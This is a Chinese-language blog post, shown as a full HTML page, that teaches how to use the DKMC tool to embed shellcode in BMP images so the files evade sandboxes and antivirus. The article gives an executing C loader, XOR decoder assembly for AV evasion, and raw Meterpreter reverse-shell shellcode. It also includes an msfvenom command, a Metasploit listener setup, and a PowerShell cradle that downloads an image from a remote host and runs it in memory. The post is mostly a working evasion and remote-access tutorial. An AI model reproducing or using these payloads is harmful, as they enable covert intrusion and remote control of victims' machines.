<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>DKMC</title>
    <meta name="description" content="在BMP文件插入shellcode">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2017/09/13/DKMC/">
    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-111240288-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">Jirairya</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collections/">
                        
                            <i class="fa fa-folder-open"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/skills/">
                        
                            <i class="fa fa-bezier-curve"></i>Skills
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tools/">
                        
                            <i class="fa fa-toolbox"></i>Tools
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-paper-plane"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>DKMC</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2017-09-13
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
    
        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>&nbsp;
    
        <a href="/category/#bin" title="Category: bin" rel="category">bin</a>&nbsp;
    
        <a href="/category/#reverse" title="Category: reverse" rel="category">reverse</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
    
        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>&nbsp;
    
        <!--a href="/tag/#tools" title="Tag: tools" rel="tag">tools</a-->
        <a href="/tag/#tools" title="Tag: tools" rel="tag">tools</a>&nbsp;
    
        <!--a href="/tag/#bin" title="Tag: bin" rel="tag">bin</a-->
        <a href="/tag/#bin" title="Tag: bin" rel="tag">bin</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <p>在BMP文件插入shellcode</p>

<ul id="markdown-toc">
  <li><a href="#设想" id="markdown-toc-设想">设想</a></li>
  <li><a href="#bmp文件" id="markdown-toc-bmp文件">BMP文件</a>    <ul>
      <li><a href="#bmp头文件格式" id="markdown-toc-bmp头文件格式">BMP头文件格式</a></li>
      <li><a href="#bmp的延伸" id="markdown-toc-bmp的延伸">BMP的延伸</a></li>
      <li><a href="#bmp-shellcode" id="markdown-toc-bmp-shellcode">BMP-&gt;shellcode</a></li>
    </ul>
  </li>
  <li><a href="#混淆payload" id="markdown-toc-混淆payload">混淆payload</a></li>
  <li><a href="#运行程序" id="markdown-toc-运行程序">运行程序</a></li>
  <li><a href="#调试" id="markdown-toc-调试">调试</a></li>
  <li><a href="#利用" id="markdown-toc-利用">利用</a></li>
  <li><a href="#powershell-payload" id="markdown-toc-powershell-payload">Powershell payload</a></li>
</ul>

<!--more-->

<h2 id="设想">设想</h2>

<p>在目标执行shellcode之前，应该考虑：</p>

<p><img src="/img/hack/DKMC/1505200502936.png" alt="shellcode" /></p>

<p>大量沙盒只会分析可执行程序，DLL，Word文件，Java 程序等，对于图片文件或其他的危害小的文件并不会消耗CPU资源去着重分析。</p>

<h2 id="bmp文件">BMP文件</h2>

<p>典型的BMP图像由四部分组成：</p>

<ul>
  <li>位图文件头数据结构，包含BMP图像文件的类型、显示内容等信息</li>
  <li>位图信息数据结构，包含BMP图像的宽、高、压缩方法，以及颜色定义</li>
  <li>调色板，该部分可选，有些位图需要调色板，有些位图（真彩色图，24位的BMP）就不需要调色板</li>
  <li>位图数据，这部分的内容根据BMP位图使用的位数不同而不同，在24位图中直接使用RGB，而其他的小于24位的使用调色板中颜色索引值</li>
</ul>

<h3 id="bmp头文件格式">BMP头文件格式</h3>

<p>BMP的头：</p>

<table>
  <thead>
    <tr>
      <th>起始地址</th>
      <th>字节</th>
      <th>描述</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td>2</td>
      <td>signature为4D42（即’BM’）</td>
    </tr>
    <tr>
      <td>2</td>
      <td>4</td>
      <td>BMP文件字节大小</td>
    </tr>
    <tr>
      <td>6</td>
      <td>2</td>
      <td>保留区域，为0</td>
    </tr>
    <tr>
      <td>8</td>
      <td>2</td>
      <td>保留区域，为0</td>
    </tr>
    <tr>
      <td>10</td>
      <td>4</td>
      <td>图片数据起始偏移值</td>
    </tr>
    <tr>
      <td>14</td>
      <td>4</td>
      <td>位图头信息结构大小，为40</td>
    </tr>
    <tr>
      <td>18</td>
      <td>4</td>
      <td>图片的像素宽度</td>
    </tr>
    <tr>
      <td>22</td>
      <td>4</td>
      <td>图片的像素高度</td>
    </tr>
    <tr>
      <td>26</td>
      <td>2</td>
      <td>图像的平面数（目标设备的级别），为1</td>
    </tr>
    <tr>
      <td>28</td>
      <td>2</td>
      <td>每个像素的比特数，为1（双色）,4(16色),8(256色),24（真彩色）</td>
    </tr>
    <tr>
      <td>30</td>
      <td>4</td>
      <td>压缩类型（0=none,1=RLE-8,2=RLE-4）</td>
    </tr>
    <tr>
      <td>34</td>
      <td>4</td>
      <td>图像数据大小（包括填充数据）</td>
    </tr>
    <tr>
      <td>38</td>
      <td>4</td>
      <td>位图水平分辨率，单位像素/m</td>
    </tr>
    <tr>
      <td>42</td>
      <td>4</td>
      <td>位图垂直分辨率，单位像素/m</td>
    </tr>
    <tr>
      <td>46</td>
      <td>4</td>
      <td>图像实际使用的颜色数量，可能为0</td>
    </tr>
    <tr>
      <td>50</td>
      <td>4</td>
      <td>图像显示过程中重要颜色数量，可能为0</td>
    </tr>
  </tbody>
</table>

<p><img src="/img/hack/DKMC/1505202967397.png" alt="BMP的头" /></p>

<p>例如，有效的BM头：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x4d42deadbeef00000000
  |   |       |   |________ .reversed,可能为0
  |   |       |____________ .reversed,可能为0
  |   |
  |   |____________________ .size of BMP
  |
  |_________________________ .signature(BM)
</code></pre></div></div>

<h3 id="bmp的延伸">BMP的延伸</h3>

<p><img src="/img/hack/DKMC/1505205009597.png" alt="" /></p>

<p><img src="/img/hack/DKMC/1505205000605.png" alt="" /></p>

<p>同样的有效的BMP也可以称为有效的shellcode。</p>

<p><strong><code class="highlighter-rouge">BM</code>是BMP必须包含的头标志</strong></p>

<p><code class="highlighter-rouge">0x424d</code>的汇编形式为：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: 42 inc edx
1: 4d dec ebp
</code></pre></div></div>

<p>这些没有内存指向的结构不会崩溃：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov eax, DWORD [ecx + 0x13]
</code></pre></div></div>

<p>危险的代码会崩溃，因为没有方法可以确认<code class="highlighter-rouge">ecx</code>寄存器指向初始化的数据。</p>

<p><img src="/img/hack/DKMC/1505205418010.png" alt="" /></p>

<p>修改之前，十六进制编辑器打开是：</p>

<p><img src="/img/hack/DKMC/1505206455358.png" alt="" /></p>

<p>16进制编辑器修改之后为：</p>

<p><img src="/img/hack/DKMC/1505206482671.png" alt="" /></p>

<p>图片变为：</p>

<p><img src="/img/hack/DKMC/1505206494213.png" alt="" /></p>

<p>降低像素高度：</p>

<p><img src="/img/hack/DKMC/1505206625199.png" alt="" /></p>

<p><img src="/img/hack/DKMC/1505206641677.png" alt="" /></p>

<h3 id="bmp-shellcode">BMP-&gt;shellcode</h3>

<p>调整BMp的头，跳转到<code class="highlighter-rouge">0x0003c650</code>地址处的shellcode：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BM + jmp instruction = 3 bytes
jmp 0x0003c650 – 0x3 = opcode e9 49 c6 03 00
</code></pre></div></div>

<p>测试图片：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;Windows.h&gt;
int main(int argc, char **argv) {
HANDLE hFile = NULL;
CHAR *buffer = NULL;
DWORD dwSize = 0;
DWORD dwReaded = 0;
int(*shellcode)(void);
hFile = CreateFile(argv[1],
GENERIC_READ,
FILE_SHARE_READ,
NULL,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL,
NULL);
if(hFile != INVALID_HANDLE_VALUE) {
dwSize = GetFileSize(hFile, NULL);
buffer = GlobalAlloc(GPTR, dwSize);
printf("Buffer located at %p\n", buffer);
ReadFile(hFile, buffer, dwSize, &amp;dwReaded, NULL);
shellcode = (int(*)())buffer;
shellcode();
}
return 0;
}
</code></pre></div></div>

<p>开始通过调试器调试执行程序，并在调用<code class="highlighter-rouge">EAX</code>处下断点，EAX指向包含图片的缓冲区：</p>

<p><img src="/img/hack/DKMC/1505207126108.png" alt="" /></p>

<p>F7跳转到图像shellcode处：</p>

<p><img src="/img/hack/DKMC/1505207181350.png" alt="" /></p>

<p>因此这样就可以创建出有效可用的shellcode payload。</p>

<h2 id="混淆payload">混淆payload</h2>

<p>一张图片也可以称为有效的shellcode payload。这张图可以在网络上传输，也一样可以作为shellcode执行。</p>

<p>至此，就可以绕过大部分的沙盒，很多沙盒并不会分析这张简单的BMP图片。</p>

<p>IDS/IPS和AV可能会执行静态分析，检测恶意程序（meterpreter和Cobalt Strike Beacon）</p>

<p>接下来就是混淆payload,可以通过使用简单的逻辑操作加密shellcode，比如使用异或(xor)</p>

<p>密钥为在<code class="highlighter-rouge">0x11111111</code>到<code class="highlighter-rouge">0xffffffff</code>32位的整型数。</p>

<p>为了防止爆破出真实代码，模糊处理时一定要使用key。</p>

<p>通过84字节的汇编代码规避AV：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: eb 44              jmp   46
2: 58                 pop   eax
3: 68 XX XX XX XX     push  0xXXXXXXXX
8: 5e                 pop   esi
9: 31 c9              xor   ecx,ecx
b: 89 cb              mov   ebx,ecx
d: 6a 04              push  0x4
f: 5a                 pop   edx
10: 68 XX XX XX XX    push  0xXXXXXXXX
15: 5e                pop   esi
16: ff 30             push  DWORD PTR [eax]  &lt;--.
18: 59                pop   ecx                 |
19: 0f c9             bswap ecx                 |
1b: 43                inc   ebx                 |
1c: 31 d9             xor   ecx,ebx             |
1e: 81 f9 XX XX XX XX cmp   ecx,0xMAGIC         |           
24: 68 XX XX XX XX    push  0xXXXXXXXX          |
29: 5f                pop   edi                 |
2a: 75 f0             jne   16   &lt;--------------.
2c: 0f cb             bswap ebx
2e: b9 02 00 00 00    mov   ecx,0x2
33: 01 d0             add   eax,edx &lt;------------. 
35: 31 18             xor   DWORD PTR [eax],ebx  |
37: 68 XX XX XX XX    push  0xXXXXXXXX           |
3c: 5f                pop   edi                  |
3d: e2 f4             loop  33 &lt;-----------------.
3f: 2d 04 00 00 00    sub   eax,0x4
44: ff e0             jmp   eax
46: e8 b7 ff ff ff    call  2
</code></pre></div></div>

<p><img src="/img/hack/DKMC/1505224485585.png" alt="" /></p>

<p>最后混淆的代码有如下的结构：</p>

<p>假定密钥为:<code class="highlighter-rouge">0x13371337</code>
魔术数为：<code class="highlighter-rouge">0x41414141</code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x41414141 + original shellcode
     ⊕          ⊕         ⊕
0x13371337 0x13371337 0x13371337
     =
0x52765276 0x4bcdf61a 0x1831daee
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:  43                inc   ebx
b:  ff 30             push  DWORD PTR [eax]
d:  59                pop   ecx
e:  0f c9             bswap ecx
10: 31 d9             xor   ecx,ebx
12: 81 f9 XX XX XX XX ecx,  0xXXXXXXXX
18: 75 f0             jne   a
</code></pre></div></div>

<blockquote>
  <p>EBX包含测试所用密钥
EAX指向混淆数据
EAX中的32位值压栈，然后从ECX寄存器pop，所有的ECX的值被交换，ECX中的值和EBX中的值进行异或，异或结果将和魔术数进行比较，直到ECX的值匹配魔术数为止。</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1e:     b9 XX XX XX XX          mov ecx,0xXXXXXXXX
21:     01 d0                   add eax,edx
23:     31 18                   xor DWORD PTR [eax],ebx
25:     e2 fa                   loop 21
</code></pre></div></div>

<blockquote>
  <p>ECX寄存器作为循环体的计数器
DWORD=4字节。循环次数=shellcode长度/4
用EBX中的密钥异或已混淆的4字节shellcode
循环直到所有值的混淆已经解开</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>27:     2d XX XX XX XX      sub   eax,0xXXXXXXXX
2b:     ff e0               jmp   eax
</code></pre></div></div>

<blockquote>
  <p>EAX现在指向shellcode的结尾
为了指向起始位置，减少shellcode长度
跳转到解混淆的shellcode
执行最后的payload(meterpreter/Cobalt Strike beacon)</p>
</blockquote>

<h2 id="运行程序">运行程序</h2>

<p><img src="/img/hack/DKMC/1505229024760.png" alt="" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x1f\x90\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5
</code></pre></div></div>

<p><img src="/img/hack/DKMC/1505229795425.png" alt="" /></p>

<p><img src="/img/hack/DKMC/1505229889689.png" alt="" /></p>

<h2 id="调试">调试</h2>

<p>在xp下使用OD，在<code class="highlighter-rouge">40106D</code>下断点</p>

<p><img src="/img/hack/DKMC/1505268765667.png" alt="" /></p>

<p>F9运行，F7跳转到shellcode中：</p>

<p><img src="/img/hack/DKMC/1505269131762.png" alt="" /></p>

<p><img src="/img/hack/DKMC/1505269239867.png" alt="" /></p>

<p><img src="/img/hack/DKMC/1505269416278.png" alt="" /></p>

<h2 id="利用">利用</h2>

<p>使用msfvenom生成shellcode：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.222.141 LPORT=2333 -f c &gt; cat.c
</code></pre></div></div>

<p><img src="/img/hack/DKMC/1505273068236.png" alt="" /></p>

<p>shellcode内容如下：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xc0\xa8\xde\x8d\x68\x02\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5
</code></pre></div></div>

<p>使用DKMC，将shellcode写入图片文件：</p>

<p><img src="/img/hack/DKMC/1505273199594.png" alt="" /></p>

<p>在msf中配置，监听：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set LHOST 192.168.222.141
LHOST =&gt; 192.168.222.141
msf exploit(handler) &gt; set LPORT 2333
LPORT =&gt; 2333
msf exploit(handler) &gt; run
</code></pre></div></div>
<p><img src="/img/hack/DKMC/1505273931097.png" alt="" /></p>

<p>在windows7中使用加载器加载图片：</p>

<p><img src="/img/hack/DKMC/1505273338280.png" alt="" /></p>

<p>返回meterpreter:</p>

<p><img src="/img/hack/DKMC/1505274090181.png" alt="" /></p>

<p><img src="/img/hack/DKMC/1505274026521.png" alt="" /></p>

<h2 id="powershell-payload">Powershell payload</h2>

<p>生成powershell的payload，然后下载并在内存中运行。</p>

<p>使用脚本下载图片取决于System.Net.WebClient，然后分配虚拟空间、创造线程执行shellcode</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Byte[]]$var_code = (New-Object
System.Net.WebClient).DownloadData("http://image.com/cat.bmp")
$var_buffer =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get
_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr],
[UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero,
$var_code.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer,
$var_code.length)
$var_hthread =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get
_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr],
[UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
([IntPtr]))).Invoke([IntPtr]::Zero,0,$var_buffer,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get
_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type
@([IntPtr], [Int32]))).Invoke($var_hthread,0xffffffff) | Out-Null
</code></pre></div></div>

<p><img src="/img/hack/DKMC/1505285906928.png" alt="" /></p>

<p>参考：https://github.com/Mr-Un1k0d3r/DKMC</p>

        </article>
        <hr>

        
        
            
            
                
                    
                        
                        <h2 id="similar_posts">Similar Posts</h2>
                        <ul>
                        
                        <li class="relatedPost">
                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/27/open-RDP/">开启RDP
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
        
            </ul>
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2017/09/11/struts2-052/">struts2-052漏洞复现</a></p>
        
    </div>
    <div class="nex">

        
        <p><strong>下一篇</strong> <a href="/2017/09/15/linux-commands/">日常使用Linux</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'http://localhost:4000/2017/09/13/DKMC/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://localhost:4000/2017/09/13/DKMC/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//http-b404-xyz.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#similar_posts">Similar Posts</a></li>
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
             The quieter you become, the more you can hear. 
        </p>

        <br>
        <p class="contact">
             
            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
            
        </p>
        <!--
        <p>
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
    -->
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
            </span>
        </p>
    </div>
</footer>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
